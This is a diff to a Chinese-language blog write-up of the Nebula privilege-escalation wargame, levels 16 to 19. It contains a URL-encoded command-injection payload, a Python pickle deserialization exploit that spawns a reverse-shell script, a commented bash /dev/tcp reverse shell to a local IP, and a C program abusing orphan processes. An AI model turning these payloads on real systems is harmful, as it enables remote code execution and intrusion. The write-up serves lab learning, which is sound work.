@@ -3,6 +3,8 @@ layout: post
 title: Nebula WriteUp
 ---
 
+> 重在过程，收获良多
+
 ##level00:
 
 ```
@@ -187,3 +189,91 @@ int __libc_start_main
 gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic hack.c -o mh.so
 
 把libc静态编译到动态共享库中
+
+##level16
+
+浪费了我半天时间，原来放到tmp竟然可以，而放到level16的HOME下为何不可，通配符为何不起作用？
+
+`http://192.168.31.105:1616/index.cgi?username=%22%26/*/GETFLAG%3E%3Eds%22&password=abc`
+
+##level17
+
+代码很短，越看pickle越可疑，开始以为是i处命令注入，但反复试了试，行不通。
+后来看了看pickle的介绍，说可以打包任意对象，官方又说了，不要相信网络上来的pickle
+包，因为pickle可以被用来任意执行代码。
+
+Google，然后发现原来是loads()的时候，触发__recude__()函数产生的，那么，重写reduce()
+函数，os.system()没有得到想要的结果，换了subprocess.Popen以后，搞定了
+
+
+```
+#!/usr/bin/env python2
+import pickle
+import socket
+import os
+import subprocess
+
+s = socket.socket()
+s.connect(("192.168.31.105", 10007))
+
+class Getshell(object):
+    def __reduce__(self):
+        return (subprocess.Popen, (('/tmp/reshell',),))
+        #return (subprocess.Popen, (('/bin/bash -i >& /dev/tcp/192.168.31.148/1234 0>&1',),))
+
+wr = pickle.dumps(Getshell())
+s.send(wr)
+print s.recv(4096)
+```
+
+这种方法有点笨，还需要对端配合，写好一个反连脚本. 注释掉那个方法不行，env的原因？
+
+##level18
+
+solve1:
+
+用ulimit -Sn限制打开句柄，竟然是一个进程内部的数量，所以在外部写一个打开再多文件句柄的程序也没用
+
+触发fopen失败,即可绕过限制
+
+##level19
+
+孤儿进程会由Init主动接管并管理，这里所有孤儿进程的父进程都是init了，所以getppid()应该是0,其uid必为root
+
+根据这个原理构造孤儿进程。
+
+初始想法由shell中生成一个commandline关闭以后，不影响运行进程的进程
+如：`((yourcommandline &)&)`
+
+这样是行不通的，因为跑shell命令时，相当于又起了一个sh
+
+只有写fork()程序，显式的关闭父进程，子进程执行flag19。
+
+执行getflag命令可行，但反弹shell不好使，已确认的是已经与listen的端口取得了连接，但输入输出流没定向过来
+
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main() {
+    pid_t c;
+    c = fork();
+    if (c == 0) {
+        fprintf(stdout, "child process.\n");
+        //char * argv[] = { "/tmp/reshell" , NULL};
+        //char * argv[] = { "/bin/sh",  "-c", "/tmp/reshell" , NULL};
+        char * argv[] = { "/bin/sh",  "-c", "getflag>>result" , NULL};
+        char * envp[] = {"PATH=/bin:/usr/bin", NULL};
+        execve("/home/flag19/flag19", argv, envp);
+        /*system("/home/flag19/flag19 --rcfile /tmp/reshell 2>&1 >/tmp/abcfile");*/ //system函数还是与execve函数有挺大区别的
+    } else {
+        printf("parent process.\n");
+        exit(0);
+    }
+    return 0;
+}
+```
+
+
